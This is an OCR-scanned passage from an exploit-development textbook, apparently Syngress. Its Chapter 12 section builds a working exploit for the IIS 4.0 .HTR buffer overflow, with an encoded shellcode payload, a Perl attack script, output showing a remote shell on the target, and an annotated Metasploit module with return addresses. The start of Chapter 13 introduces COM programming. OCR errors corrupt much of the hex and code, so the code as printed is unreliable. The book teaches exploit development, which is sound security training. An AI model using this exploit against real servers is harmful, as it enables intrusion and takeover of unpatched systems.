10 '\x4f\x45\x42\x32\x41\x50\x4b\x4e\x43\x4e\x42\x43\x49\x34\x4b\x58-
11 -\x46\x43\x4b\x58\x41\x50\x50\x4e\x41\x53\x42\x4c\x49\x59\x4e\x4a" 
12 -\x46\x58\x42\x4c\x46\x37\x47\xSO\x41\x4c\x4c\x4c\x4d\x50\x41\x50-
13 "\x44\x4c\x4b\x4e\x46\x4f\x4b\x53\x46\x55\x46\x32\x4a\x52\x45\x37" 
14 •\x43\x4e\x4b\x58\x4f\x45\x46\x42\x41\x50\x4b\x4e\x48\x36\x4b\x48-
15 '\x4e\x30\x4b\x54\x4b\x58\x4f\x55\x4e\x51\x41Vx30\x4b\x4e\x43\x30p 
16 -\x4e\x32\x4b\x38\x49\x38\x4e\x5cAx46\x32\x4e\x41\x41\x56\x43\x4c-
17 -\x41\x33\x42\x4c\x46\x36Vx4b\x38\x42\x44\x42\x43\x4b\x48\x42\x44" 
18 -\x4e\x30\x4b\x38\x42\x47\x4e\x31\x4d\x4a\x4b\x38\x42\x44\x4a\x50" 
19 •\x50\x35\x4a\x56\x50\x3B\x50\x34\x50\x30\x4e\x4e\x42\x35\x4f\x4f" 
20 "\x48\x4d\x4I\x33\x4b\x4d\x48\xS6\x43\x55\x48\x46\x4a\x46\x43\x53* 
21 -\x44\x33\x4a\x36\x47\x47\x43\x47\x44\x53\x4f\x35\x46\x45\x4f\x4f• 
22 -\x42\x4d\x4a\x46\x4b\x4c\x4d\x4e\x4e\x4£\x4b\x53\x42\x5S\x4f\x4f-
23 '\x48\x4d\x4f\x55\x49\x3fl\x45\x4e\x48\x56\x41\x48\x4d\x4e\x4a\x30" 
24 -\x44\x30\x45\x45\x4c\x46\x44\x30\x4f\x4£\x42\x4d\x4a\x56\x49\x4d-
25 '\x49\x30\x45\x4f\x4d\x4a\x47\x35\x4£\x4£\x4B\x4d\x43\x45\x43\x45-
26 -\x43\x45\x43\x55\x43\x55\x43\x44\x43\x45\x43\x44\x43\x35\x4f\x4£" 
27 -\x42\x4d\x48\x36\x4a\x46\x4c\x37\x49\x46\x48\x46\x43\x35\x49\x38" 
28 -\x41\x4e\x45\x59\x4a\x46\x46\x4a\x4c\x31\x42\x47\x47\x4c\x47\x35-
29 
"\x4f\x4f\x43\x4d\x4c\x46\x42\x31\x41\xS5\x4 5\x45\x4f\x4f\x42\x4d" 
30 -\x4a\xS6\x46\x4a\x4d\x4a\x50\x42Vx49\x4e\x47Vx35\x4rAx4f\x48\x4d-
31 "\x43\x35\x45\x3S\x4£\x4£\x42\x4d\x4a\x3S\x45\x4e\x49\x44\x48\x58" 

526 
Chapter 12 * Writing Exploits III 
32 
33 
34 
35 
36 
37 
38 
39 
40 
41 
42 
43 
44 
45 
46 
47 
48 
49 
50 
51 
52 
53 
54 
55 
56 
"\x49\x54\x47\x55\x4f\x4f\x48\x4d\x42\x45\x46\x45\x46\x45\x45\x55". 
"\x4f\x4f\x42\x4d\x43\x49\x4a\x56\x47\x4e\x49\x37\x48\x4c\x49\x.57-. 
,'\x47\x35\x4£\x4f\x43\x4d\x45\x35\x4f\x4f\x42\)t4d\x4e\x46\x4c\x46-. 
"\x46\x56\x48\x56\x4a\x46\x43\x36\x4d\x56\x49\x38\x45\x4e\x4c\x46". 
"\x42\x55\x49\x55\x49\x42\x4e\x4c\x49\x48\x47\x4e\x4c\x46\x46\x34". 
n\x49\x48\x44\x4e\x41\x53\x42\x4e\x43\x4f\x4c\x4a\x50\x4£\x44\x44-. 
"\x4a\x32\x50\x4f\x44\x44\x4e\x52\x43\x49\x4d\x58\x4c\x47\x4a\x33". 
"\x4b\x4a\x4b\x4a\x4b\x4a\x4a\x56\x44\x37\x50\x4f\x43\x4b\x48\x51". 
"\x4f\x4f\x45\x57\x46\x44\x4f\x4f\x48\x4d\x4b\x35\x47\x35\x44\x55". 
"\x41\x55\x41\x35 X41\;<55\x4c -bi'^M;;; x41 .:•••; 5 ' ;••.•'= I ^x55\x4 5 i r-;1: 5 ' . 
"\x41\x35\x4f\x4f\x42\x4d\x4a\x46\x4d\x4a\x49\x4d\x45\x30\x50\x4c". 
"\x43\x35\x4f\x4f\x48\x4d\x4c\x36\x4f\x4f\x4f\x4f\x47\x43\x4f\x4f-. 
"\x42\x4d\x4b\x38\x47\x45\x4e\x4f\x43\x48\x46\x4c\x46\x56\x4f\x4f. 
"\x48\x4d\x44\x35\x4f\x4f\x42\x4d\x4a\x56\x42\x4f\x4c\x58\x46\x30-. 
"\x4f\x35\x43\x55\x4f\x4f\x48\x4d\x4f\x4E\x42\x4d\x5a-; 
Jstring = "GET /"; 
$string .= "ft" x 589; 
$string .= "\x85\x63\xE7\x77"; 
$string r= Spayload; 
$string ,-".htr HTTP/1.0\r\n\r\n"; 
openWC, "|nc.exe 192.168.119,136 80"); 
print WC Sstring; 
close(NCI; 
Lines 1 to 46 set the Spay load variable equal to the encoded payload. Lines 48 and 52 
set the HTTP protocol and htr file extension requirements, and line 49 pads the offset to 
the return address.The return address is added on line 50, and then the payload is 
appended to the attack string in line 51. Lines 54 through 56 contain the code to handle 
the network communication. Our complete attack string is displayed in Figure 12.41. 
Figure 12.41 The Final Attack String 
589 bytes of padding 
4 bytes overwriting saved 
return address 
717 byes of decoder 
and encoded payload 
From the command line, we can test the exploit against our target machine. We see 
our results in Figure 12.42. 
Figure 12.42 Successfully Exploiting MS Windows NT4 SP5 Running IIS 4.0 
^/framework 
hingt 
$ perl i i s 4 h t r . p l tt 
[11 912 
~Vfraneuorh 
0 
fldnin istr«toH?nothinghutf at "Vf ramework 
$ t e l n e t 192.168.119.136 31337 
Trying 1 9 2 . 1 6 8 . 1 1 9 . 1 3 6 . . . 
Connected to 192.168.119.136. 
Escape character is 
'A]' _ 
Nicrosoft<R> Windows NKIM> 
CO Copyright 1985-1996 Microsoft Corp. 
C:\WINNI\systen32>_ 
Zl 

Writing Exploits III • Chapter 12 
527 
In the first line, we run the exploit in the background. To test if our exploit was suc-
cessful, we attempt to initiate a connection to the remote machine on port 31337, the 
listening port specified in the generation process. We see that our connection is accepted 
and a shell on the remote machine is returned to us. Success! 
Integrating Exploits into the Framework 
Now that we have successfully built our exploit, we can explore how to integrate it into 
the Metasploit Framework. Writing an exploit module for the framework has many 
advantages over writing a stand-alone exploit. When integrated, the exploit can take 
advantage of features such as dynamic payload creation and encoding, nop generation, 
simple socket interfaces, and automatic payload handling. The modular payload, encoder, 
and nop system make it possible to improve an exploit without modifying any of the 
exploit code, and they also make it easy to keep the exploit current. Metasploit provides 
a simple socket API which handles basic TCP and UDP socket communications in addi-
tion to transparently managing both SSL and proxies. As seen in Figure 12.9, the auto-
matic payload handling deals with all payload connections without the need to use any 
external programs or to write any additional code. Finally, the framework provides a 
clear, standardized interface that makes using and sharing exploit easier than ever before. 
Because of all these factors, exploit developers are now quickly moving towards frame-
work-based exploit development. 
Understanding the Framework 
The Metasploit Framework is written entirely in object-oriented Perl. All code in the 
engine and base libraries is class-based, and every exploit module in the framework is also 
class-based. This means that developing an exploit for the framework requires writing a 
class; this class must conform to the API expected by the Metasploit engine. Before delving 
into the exploit class specification, an exploit developer should gain an understanding of 
how the engine drives the exploitation process; therefore, we take an under-the-hood look 
at the engine-exploit interaction through each stage of the exploitation process. 
The first stage in the exploitation process is the selection of an exploit. An exploit is 
selected with the use command, which causes the engine to instantiate an object based 
on the exploit class.The instantiation process links the engine and the exploit to one 
another through the framework environment, and also causes the object to make two 
important data structures available to the engine. 
The two data structures are the %info and 'Vuadvauccd structures, which can be 
queried by either the user to see available options or by the engine to guide it through 
the exploitation process. When the user decides to query the exploit to determine 
required options with the info command, the information will be extracted from the 
"Aiinfo and %advanced data structures.The engine can also use the object information to 
make decisions. When the user requests a listing of the available payloads with the show 
payloads command, the engine will read in architecture and operating system informa-
tion from Volnfo, so only compatible payloads are displayed to the user.This is why in 

528 
Chapter 12 * Writing Exploits III 
Figure 12.9 only a handful of the many available payloads were displayed when the user 
executed the show payloads command. 
As stated earlier, data is passed between the Metasploit engine and the exploit via 
environment variables, so whenever a user executes the set command, a variable value is 
set that can be read by either the engine or the exploit. Again in Figure 12.9, the user 
sets the PAYLOAD environment variable equal to win32_bind; the engine later reads in 
this value to determine which payload to generate for the exploit. Next, the user sets all 
necessary options, after which the exploit command is executed. 
The exploit command initiates the exploitation process, which consists of a number 
of substages. First, the payload is generated based on the PAYLOAD environment vari-
able. Then, the default encoder is used to encode the payload to avoid bad characters; if 
the default encoder is not successful in encoding the payload based on bad character and 
size constraints, another encoder will be used. The Encoder environment variable can be 
set on the command-line to specify a default encoder, and the EncoderDontFaUThrongh 
variable can be set to 1 if the user only wishes the default encoder to be attempted. 
After the encoding stage, the default nop generator is selected based on target 
exploit architecture. The default nop generator can be changed by setting the Nop envi-
ronment variable to the name of the desired module. 
Setting NopDontFaltTkrotigh to 1 instructs the engine not to attempt additional nop 
generators if the default does not work, and RaiidomNops can be set to 1 if the user 
wants the engine to try and randomize the nop sled for xN6 exploits. RaiidomNops is 
enabled by default. For a more complete list of environment variables, check out the 
documentation on the Metasploit Web site. 
In both the encoding and nop generation process, the engine avoids the bad charac-
ters by drawing up on the information in the %iufo hash data structure. After the pay-
load is generated, encoded, and appended to a nop sled, the engine calls the exploit() 
function from the exploit module. 
The exploitQ function retrieves environment variables to help construct the attack 
string. It will also call upon various libraries provided by Metasploit such as Pex. After 
the attack string is constructed, the socket libraries can be used to initiate a connection 
to the remote host and the attack string can be sent to exploit the vulnerable host. 
Analyzing an Existing Exploit Module 
Knowing how the engine works will help an exploit developer better understand the 
structure of the exploit class. Because every exploit in the framework must be built 
around approximately the same structure, a developer need only understand and modify 
one of the existing exploits to create a new exploit module (see Example 12.7). 
Example 12.7 Metasploit Module 
57 package Msf; ; Exploit; : iis40_hti"; 
58 use base "Msf:rExploit" ; 
59 use strict; 
60 use Pex:;Text; 

Writing Exploits III • Chapter 12 
529 
Line 57 declares all the following code to be part of the iis40_htr namespace. Line 
58 sets the base package to be the Msf: :Exploit module, so the iis40_htr module inherits 
the properties and functions of the Msf::ExpIoit parent class. The strict directive is used 
in line 59 to restrict potentially unsafe language constructs such as the use of variables 
that have not previously been declared. The methods of the Pex::Text class are made 
available to our code in line 60. Usually, an exploit developer just changes the name of 
the package on line 1 and will not need to include any other packages or specify any 
other directives. 
|s*nfrnEiii 61 
my Sadvanced = { } ; 
Ui^jiMl 
Metasploit stores all of the exploit specific data within the %ittfo and Voadwiiced hash 
data structures in each exploit module. In line 61, we see that the advanced hash is 
empty, but if advanced options are available, they would be inserted as keys-value pairs 
into the hash. 
|"»E»!"I 62 my siafo = 
" 63 { 
64 
'Name1 
=> 
' I I S 4.0 
.HTR Buffer Overflow', 
65 
' V e r s i o n ' 
=> '$Revision: 1.4 %'H 
66 
' A u t h o r s ' =:> ( ' S t i n k o ' , ] , 
67 
'Arch1 
=> [ 'x86' I, 
68 
'OS1 
=> [ 'Win32' 
), 
69 
' P r i v 
=> 1, 
The %iufo hash begins with the name of the exploit on line 64 and the exploit ver-
sion on line 65. The authors are specified in an array on line 66. Lines 67 and 68 contain 
arrays with the target architectures and operating systems, respectively. Line 69 contains 
the Priv key, a flag that signals whether or not successful exploitation results in adminis-
trative privileges. 
70 
'UserOpts' 
=> { 
71 
'RHOST' =? El, 
'ADDR', 
'The t a r g e t a d d r e s s ' ] , 
72 
'RPORT' => | 1 , 
PORT', 
The t a r g e t p o r t ' , 80), 
73 
'SSL' 
=> [0, 
'BOOL'. 
'Use SSL'), 
74 
}, 
Also contained within the %iufli hash are the UserOpts values. UserOpts contains a 
subhash whose values are the environment variables that can be set by the user on the 
command line. Each key value under UserOpts refers to a four-element array.The first 
element is a flag that indicates whether or not the environment variable must be set 
before exploitation can occur.The second element is a Metasploit-specific data type that 
is used when the environment variables are checked to be in the right format.The third 
element describes the environment variable, and the optionally specified fourth element 
is a default value for the variable. 
Using the RHOST key as an example, we see that it must be set before the exploit 
will execute. The ADDR data-type specifies that the RHOST variable must be either an 
IP address or a fully qualified domain name. 
If value of the variable is checked and it does not meet the format requirements, the 
exploit will return an error message.The description states that the environment variable 
should contain the target address, and there is no default value. 

530 
Chapter 12 * Writing Exploits III 
> 820, 
-> 0, 
=> 0, 
=> 
', map { 
1, map { 
'. map { 
'. map { 
$_=chr($_) 
$_=chr($_) 
$_=chr ($_) 
S_=chr($_> 
1 
} 
} 
) 
(0x00 . 
(0x3a . 
(0x5b . 
(0x7b . 
. 0x2f)) 
. 0x40)) 
. 0x60)) 
. Oxff)) 
75 
' Payload' => { 
4 s c s s 
^ _ ^ _ I a 
'Space' 
' m -7-7 
*mm 
/ / 
'MaxNops' 
78 
'MinNops' 
79 
'BadChars 
SO 
joinl" 
81 
joint" 
82 
join I• 
83 
joint" 
84 
). 
The Payload key is also a subhash of %itifo and contains specific information about 
the payload. The payload space on line 75 is first used by the engine as a filter to deter-
mine what pay loads are available to an exploit. Later, it is reused to check against the size 
of the encoded payload. If the payload does not meet the space requirements, the engine 
attempts to use another encoder; this will continue until no more compatible encoders 
are available and the exploit fails. 
On lines 77 and 78, MaxNops and MinNops are optionally used to specify the max-
imum and minimum number of bytes to use for the nop sled. MinNops is useful when 
you need to guarantee a nop sled of a certain size before the encoded payload. MaxNops 
is mostly used in conjunction with MirtNopt when both are set to 0 to disable nop sled 
generation. 
The BadChars key on line 79 contains the string of characters to be avoided by the 
encoder, [n the preceding example, the payload must fit within 820 bytes, and it is set 
not to have any nop sled because we know that the IIS4.0 shared library trampoline 
technique doesn't require a nop sled. The bad characters have been set to all non-
alphanumeric characters. 
ifmis g5 
'Description1 
=> Pex::Text::Freeform(qq{ 
• a 86 
This exploits a buffer overflow in the ISAPI ISM.DLL used 
87 
to process HTR scripting in IIS 4.0. This module works against 
88 
Windows NT 4 Service Packs 3, 4, and 5. The server will continue 
89 
to process revests until the payload being executed has exited. 
90 
If you've set EX1TFUNC to 'seh', the server will continue processing 
91 
requests, but you will have trouble terminating a bind shell. If you 
92 
set EXITFUNC to thread, the server will crash upon exit of the bind 
93 
shell. The payload is alpha-numerically encoded without a MOP sled 
94 
because otherwise the data gets mangled by the filters. 
95 
H. 
Description information is placed under the Description key.The 
Pex:: Text:: Free for mQ function formats the description to display correctly when the 
info command is run from msfconsole. 
i t a t i s 
96 
' R e f s ' 
=> 
[ 
^ M 9 7 
['OSVDE', 
3325], 
• • • • 9 8 
['BID', 
3 0 7 ] , 
99 
I'CVE', 
'1999-0874'1, 
1 0 0 
['URL', 
'http://www.eeye.com/html/research/advisories/AD13990608.html'), 
101 
1, 

Writing Exploits III • Chapter 12 
531 
The Rgfs key contains an array of arrays, and each stibarray contains two fields. The 
first field is the information source key and the second field is the unique identifier. On 
line 98, BID stands for liugtraq ID, and 307 is the unique identifier. When the info com-
mand is run, the engine will translate line 98 into the URL 
www.securityfocus.com/bid/307. 
'.••', t 
n 
02 
03 
04 
05 
06 
'DefaultTarget• 
'Targets' => [ 
=> 0. 
1'Windows NT4 SP3 
['Windows NT4 $P4' 
['Windows NT4 £P5 ' 
, 593, 0x77f81a4d], 
593, Cx77£7635d!, 
589, 0x77£76385i , 
107 
]. 
The Targets key points to an array of arrays; each subarray consists of three fields. The 
first field is a description of the target, the second field specifies the offset, and the third 
field specifies the return address to be used.The array on line 106 tells us that the offset 
to the return address 0x77F76385 is 589 bytes on Windows NT4 Service Pack 5. 
The targeting array is actually one of the great strengths of the framework because it 
allows the same exploit to attack multiple targets without modifying any code at all. The 
user simply has to select a different target by setting the TARGET environment variable. 
The value of the DcfatiiiTargel key is an index into the Targets array, and line 102 shows 
the key being set to 0, the first element in the Targets array. This means that the default 
target is Windows NT4 SP3. 
i " " M " ' 108 
'Keys' => [ ' l i s ' ] , 
•-1 1 09 1 ; 
The last key in the %info structure is the Keys key. Keys points to an array of key-
words that are associated with the exploit. These keywords are used by the engine for fil-
tering purposes. 
r
^
" 
110 sub new f 
"3 111 
my Sclass = shift; 
112 
my $self = $class->SUPEB: :new( { ' Info1 -> SinCo, 'Advanced' -> Sadvanced}, @_) ; 
1 13 
jreturnlSself I ; 
114} 
The ncw() function is the class constructor method. It is responsible for creating a 
new object and passing the %info and %a<banced data structures to the object. Except for 
unique situations, new() will usually not be modified. 
i " 8 " ' t 
115 sub Exploit 
!| 1 1 6 L 
117 
my Sself = shift; 
118 
my $target_host = $sel£-sGetVar ('RHOST' ) f 
119 
my $target_port = $self->GetVar('RPORT'1; 
120 
my $target_idx 
= $self->GetVart'TARGET'); 
121 
my $shellcode 
= $self->GetVar(' EncodedPayload')->Payload; 
The exploitQ function is the main area where the exploit is constructed and executed. 
Line 117 shows how exploit() retrieves an object reference to itself.This reference is 
immediately used in the next line to access the GetVarQ method.The GetVarQ method 
retrieves an environment variable, in this case, RHOST. Lines 118 to 120 retrieve the 

532 
Chapter 12 * Writing Exploits III 
%r N £ I 
values of RHOST, RRORT, and TARGET, which correspond to the remote host, the 
remote part, and the index into the targeting array on line 103. As we discussed earlier, 
exploit() is called only after the payload has been successfully generated. Data is passed 
between the engine and the exploit via environment variables, so the GetVarQ method is 
called to retrieve the payload from the Encoded Payload variable and place it into SslwH-
code. 
122 
my Starget = $self->Targets->($target_idx]; 
The Starget_idx value from line 120 is used as the index into the Target array. The 
StarJet variable contains a reference to the array with targeting information. 
' 4 " i " 123 
my $at tacks tring = ("X" x $ target-> [1)) ; 
• I 124 
$attackstring .= packi1'^, $target-> [2) ) ; 
125 
$attackstring .= Sshellcode; 
Starting on line 123, we begin to construct the attack string by creating a padding 
of X characters. The length of the padding is determined by the second element of the 
array pointed to by (target. The StarJet variable was set on line 122, which refers back to 
the Targets key on line 103. Essentially, the offset value is pulled from one of the Target 
key subarrays and used to determine the size of the padding string. Line 124 takes the 
return address from one of the subarrays of the Target key and converts it to little-endian 
format before appending it to the attack string. Line 125 appends the generated payload 
that was retrieved from the environment earlier on line 121. 
126 
my ^request = "GET /" 
Sattackstring , ".htr HTTP/1.0\r\n\r\n"; 
In line 126, the attack string is surrounded by the HTTP protocol and htr file 
extension. Now the Srequest variable looks like Figure 12.43. 
Figure 12.43 The Srequest Attack String 
GET/ 
padding 
return address 
encoded payload 
.htr HTTP/1.0\r\n\rtn 
127 
, . * (, -
$self:->PrintLine{sprintf 
(*!*] 
Trying ".$target->f0]. 
Starget->[2]H; 
using call eax at Qx%. Bx. 
Now that the attack string lias been completely constructed, the exploit informs the 
user that the engine is about to deploy the exploit, 
128 
129 
130 
131 
132 
133 
134 
135 
136 
137 
138 
my $s = Msf::Socket::Tcp->new 
f 
1 PeerAc33r ' =•> $target_host -
1 PeerPort' => Starget_port„ 
' LocalPorf => Sself->GetVar['CPGRT'), 
SSL' 
=> 5self->GetVar(HSSL'), 
) t 
if ($s->I$Error) ( 
$self->PrintLine{'[*] Error creating socket: 
return; 
} 
$S->GetError); 

Writing Exploits III • Chapter 12 
533 
Lines 128 to 134 create a new TCP socket using the environment variables and 
passing them to the socket API provided by Metasploit. 
Ss-»Sent3($re(juest); 
Ss->Close(); 
return; 
139 
140 
141 
142 } 
The final lines in the exploit send the attack string before closing the socket and 
returning. At this point, the engine begins looping and attempts to handle any connec-
tions required by the payload. When a connection is established, the built-in handler 
executes and returns the result to the user as seen earlier in Figure 12.9. 
Overwriting Methods 
In the previous section, we discussed how the payload was generated, encoded, and 
appended to a nop sled before the exploit() function was called. However, we did nor 
discuss the ability for an exploit developer to override certain functions within the 
engine that allow more dynamic control of the payload compared to simply setting hash 
values. These functions are located in the Msf:Exploit class and normally just return the 
values from the hashes, but they can be overridden and modified to meet custom pay-
load generation requirements. 
For example, in line 21 we specified the maximum number of nops by setting the 
$itijo->{'Piiyload'}->{'MaxNops'} key. If the attack string were to require a varying 
number of nops depending on the target platform, we could override the 
PayloadMaxNops() function to return varying values of the MuxNops key based on the 
target.Table 12.2 lists the methods that can be overridden. 
Table 12.2 Methods that Can Be Overridden 
Method 
Description 
Equivalent Hash Value 
Payload PrependEncoder 
Payload Prepend 
PayloadAppend 
Payload Space 
PayloadSpaceBadChars 
Places data after the nop 
sled and before the decoder. 
Places data before the 
payload prior to the 
encoding process. 
Places data after the 
payload prior to the 
encoding process. 
Limits the total size of the 
combined nop sled, 
decoder, and encoded 
payload. The nop sled will 
be sized to fill up all 
available space. 
Sets the bad characters to 
be avoided by the encoder. 
$info->{'Payload'}-
> {'PrependEncoder'} 
$info->{'Payload'}-
>{'Prepend'} 
$info->{'Payload'}-
>{'Append'} 
$info->{'Payload'}-
> {'Space'} 
$info->{'Payload'}-
>{'BadChars'} 
Continued 

534 
Chapter 12 • Writing Exploits 
Table 12.2 Methods that Can Be Overridden 
Method 
Description 
Equivalent Hash Value 
PayloadMinNops 
PayloadMaxNops 
NopSaveRegs 
Sets the minimum size of 
the nop sled. 
Sets the maximum size of 
the nop sled. 
Sets the registers to be 
avoided in the nop sled. 
$info->{'Payload'}-
>{'MinNops} 
$info->{'Payload'}-
>{'MaxNops} 
$info->{'Nop'}-
>{'SaveRegs'} 
Although this type of function overriding is rarely necessary, knowing that it exists 
may come in handy at some point. 
Summary 
Developing reliable exploits requires a diverse set of skills and a depth of knowledge that 
simply cannot be gained by reading through an ever-in creasing number of meaningless 
whitepapers.The initiative must be taken by the reader to close the gap between theory 
and practice by developing a working exploit. The Metasploit project provides a suite of 
tools that can be leveraged to significantly reduce the overall difficulty of the exploit 
development process, and at the end of the process, the exploit developer will not only 
have written a working exploit but also gained a better understanding of the complexi-
ties of vulnerability exploitation. 
Solutions Fast Track 
Using the Metasploit Framework 
0 The Metasploit Framework has three interfaces; msfcli, a single command-line 
interface; msfweb, a Web-based interface; and msfconsole, an interactive shell 
interface. 
0 
0 
The msfconsole is the most powerful of the three interfaces. To get help at any 
time with msfconsole, enter the ? or help command. The most useful 
commonly used commands are show, set, info, use, and exploit, 
After selecting the exploit and setting the exploit options, the payload must be 
selected and tbe payload options must be set. 
www.syngress.com 

Writing Exploits III * Chapter 12 
535 
Exploit Development with Metasploit 
0 
The basic steps to develop a buffer overflow exploit are determining the attack 
vector, finding the offset, selecting a control vector, finding and using a return 
address, determining bad characters and size limitations, using a nop sled, 
choosing a payload and encoder, and testing the exploit. 
0 The PatternCreatefj and patternOffset.pl tools can help speed up the offset 
discovery phase. 
0 
The Metasploit Opcode Database, nisfpescan, or msfelfscan can be used to find 
working return addresses. 
0 Exploits integrated in the Metasploit Framework can take advantage of 
sophisticated nop generation tools. 
0 
Using Metasploit's online payload generation and encoding or the msfpayload 
and msfencode tools, the selection, generation, and encoding of a payload can 
be done automatically. 
Integrating Exploits into the Framework 
0 
All exploit modules are built around approximately the same template, so 
integrating an exploit is as easy as modifying an already existing module. 
0 
Environment variables are the means by which the framework engine and each 
exploit pass data between one another; they can also be used to control engine 
behavior. 
0 The %info and Vaadvanced hash data structures contain all the exploit, targeting, 
and payload details.The exploitfj function creates and sends the attack string. 
Links to Sites 
www.metasploit.com The home of the Metasploit Project. 
www.nologin.org A site that contains many excellent technical papers by 
skape about Metasploit's Meterpreter, remote library injection, and Windows 
shellcode. 
www.immunitysec.com Immunity Security produces the commercial pen-
etration testing tool Canvas. 
www.corest.com Core Security Technologies develops the commercial 
automated penetration testing engine Core IMPACT. 
www.eeye.com An excellent site for detailed Microsoft Windows-specific 
vulnerability and exploitation research advisories. 
www.syngress.com 

536 
Chapter 12 • Writing Exploits Ml 
Frequently Asked Questions 
The following Frequently Asked Questions, answered by the authors of this book, 
are designed to both measure your understanding of the concepts presented in 
this chapter and to assist you with real-life implementation of these concepts. To 
have your questions about this chapter answered by the author, browse to 
www.syngress.com/solutions and click on the "Ask the Author" form. You will 
also gain access to thousands of other FAQs at ITFAQnet.com. 
Q: Do I need to know how to write shellcode to develop exploits with Metasploit? 
A: No.Through either the msfweb interface or msfpayload and msfencode, an 
exploit developer can completely avoid having to deal with shellcode besides 
cutting and pasting it into die exploit, li an exploit is developed within the 
Framework, the exploit developer may never even see the payload. 
Q: Do I have to use an encoder on my payload? 
A: No. As long as you avoid the bad characters, you can send over any payload 
without encoding it.The encoders are there primarily to generate payloads that 
avoid bad characters? 
Do 1 have to use the nop generator when integrating an exploit into the frame-
work? 
M^k 
MaxNops and MinNt 
No.You can set the MaxNops and MinNops keys to 0 under the Payload key, 
which is under the %mfo hash.This will prevent the framework from automati-
cally appending any nops to your exploit. Alternatively, you can overwrite the 
PayloadMaxNops and PayloadMinNops functions not to return any nops. 
I've found the correct offset, discovered a working return address, determined 
the bad character and size limitations, and successfully generated and encoded 
my payload. For some reason, the debugger catches the process when it halts 
execution partway through my payload. I don't know what's happening, but it 
appears as though my payload is being mangled. I thought I had figured out all 
the bad characters. 
Most likely what is happening is that a function is being called that modifies 
stack memory in the same location as your payload.This function is being called 
after the attack string is placed on the stack, but before your return address is 
popped into EIR Consequently, the function will always execute, and there's 
nothing you can do about it. Instead, avoid the memory locations where the 
www.syngress.com 

Writing Exploits III * Chapter 12 
537 
payload is being mangled by changing control vectors. Alternatively, write 
custom shellcode that jumps over these areas using the same technique described 
in the Space Trickery sidebar. In most cases, when determining size limitations, 
close examination of the memory window will alert you to any areas that are 
being modified by a function. 
Q: Whenever I try to determine the offset by sending over a large buffer of strings, 
the debugger always halts too early claiming something about an invalid memory 
address. 
A: Chances are a function is reading a value from the stack, assuming that it should 
be a valid memory address, and attempting to dereference it. Examination of the 
disassembly window should lead you to the instruction causing the error, and 
combined with the memory window, the offending bytes can be patched in the 
attack string to point to a valid address location. 
Q: To test if my return address actually takes me to my payload, I have sent over a 
bunch of "a" characters as my payload. I figure that E1P should land on a bunch 
of "a" characters and since "a" is not a valid assembly instruction, it will cause the 
execution to stop. In this way, I can verify that EIP landed in my pay load. Yet this 
is not working. When the process halts, the entire process environment is not 
what I expected. 
A: The error is in assuming that sending a bunch of "a" characters would cause the 
processor to fault on an invalid instruction. Filling the return address with four 
"a" characters might work because 0x61616161 may be an invalid memory 
address, but on a 32-bit x86 processor, the "a" character is 0x61, which gets 
interpreted as the single-byte opcode for POPAD.The POPAD instruction suc-
cessively pops 32-bit values from the stack into the following registers EDI, ESI, 
EBP, nothing {ESP placeholder), EBX, EDX, ECX, and EAX. When EIP reaches 
the "a" buffer, it will interpret the "a" letter as POPAD.This will cause the stack 
to be popped multiple times, and cause the process environment to change com-
pletely This includes EIP stopping where you do not expect it to stop. A better 
way to ensure that your payload is being hit correctly is to create a fake payload 
that consists of OxCC bytes.This instruction will not be misinterpreted as any-
thing but the INT3 debugging breakpoint instruction. 


Chapter 13 
Writing Security 
Components 
Solutions in this Chapter: 
• 
COM 
ATL 
Adding COM Extensions to the 
Related Chapters: Chapter 14 
! RPCDUMP Tool 
U l 
El Summary 
0 Solutions Fast Track 
El Frequently Asked Questions 
539 
«J

540 
Chapter 13 * Writing Security Components 
Introduction 
Advanced security tools often depend on functionality implemented by other security 
tools. Because of this fact, a security tool author has a decision to make between writing 
new code and reusing code from an existing security tool. As with any type of code 
reuse, reusing functionality from an existing code base enables benefits such as faster 
development cycles. 
Reusing existing code depends largely upon how it is written. The best scenario is if 
the desired code is self-contained and easily includable (such as a C++ class or a DLL) 
into your development project.This is largely not the case, however, and it is often nec-
essary to port the code into a self-contained module. 
The type of module the code is integrated into varies depending upon the project's 
requirements. The most common scenarios include C++ classes and dynamic link 
libraries. But what happens when the requirements change, or when a new tool is devel-
oped in a different language? The same process of integration is performed, or the code 
is scrapped and rewritten. 
This chapter explores a different type of module integration that allows code to be 
accessed in a language-independent and even host-independent manner; by using the 
Component Object Model (COM).You will learn what COM is, how it can be imple-
mented easily using Active Template Library (ATL), and how to integrate it directly into 
an existing security tool, followed by an example. 
COM 
A good understanding of the Component Object Model (COM) theory is important in 
developing applications based on COM technology. However, that is not the point of 
this primer. Many other good books teach this, such as Inside GOM by Dale Rogerson 
(Redmond, WA: Microsoft Press, 1996) The goal of this section is to give you an opera-
tional knowledge of the most common COM technology that you will encounter. 
COM is a specification that defines a binary standard that governs all aspects of how 
a module is loaded and accessed.The glue between the specification and your code is 
the COM runtime, which handles the ins and outs of loading and accessing objects 
across process and network barriers. 
COM Objects 
A COM object is like any other type of object in that it has methods, properties, and an 
internal state. The methods and properties, unlike other object technologies, must be 
accessed through an interface. A COM object may have numerous interfaces—all of 
which are derived from the I Unknown interface (discussed next). In order to acquire a 
pointer to an object's interface, you must ask for it—specifically, you ask through the 
COM runtime, during loading. 

Writing Security Components • Chapter 13 
541 
COM Interfaces 
The binary standard for the COM specification dictates two criteria for COM interfaces: 
support of the lUnknown interface, and adherence to a common calling convention. 
IUnknown 
The first three functions of any COM interface must be that of the lUnknown inter-
face: Query Interface, AddRef, and Release. The Query Interface function is the means of 
asking an object if it supports a particular interface. If it does, a pointer to the interface is 
returned. Otherwise, an error code is returned. 
COM objects are reference counted; the AddRef and Release functions control that 
reference count. As their names suggest, AddRef increments the reference count and 
Release decrements it. When an interface is returned through an out parameter of a 
function, its reference must already be incremented. When the use of the interface is 
complete, the client must call Release. 
Calling Convention 
The required calling convention is the standard calling convention, known as stdcall. In 
order to support this calling convention in code, the function's name in its definition 
and declaration must be preceded with the keyword 
stdcall. This syntax tells the com-
piler that the callee cleans the stack after a function call. An example of using this calling 
convention is as follows: 
int 
stdcall MyFunction() 
{ 
return 10; 
} 
The COM Runtime 
The COM runtime is what gets everything off the ground for the client. Before the 
COM runtime can be used, however, it must be initialized. Initialization consists of a call 
to Colnitialize or CoInitializeEx.The only difference between the two is that 
CoInitializeEx allows the client to specify a threading model. Put simply, the COM run-
time ensures that all client access to objects, and vice versa, is done through a compatible 
threading model. If an incompatible value is specified, the runtime will improvise, if pos-
sible, by loading a proxy module. This process is abstracted from view and you don't need 
to consider it for single-threaded scenarios. In addition, when use of the runtime is com-
